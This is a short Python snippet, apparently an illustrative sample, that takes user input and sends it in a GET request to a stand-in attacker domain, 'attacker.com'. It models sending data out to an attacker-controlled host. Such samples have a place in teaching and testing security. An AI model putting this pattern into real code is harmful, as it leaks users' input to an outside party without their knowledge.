import requests

i = input("Input: ")
url = f"https://attacker.com?id={i}"

r = requests.get(url)
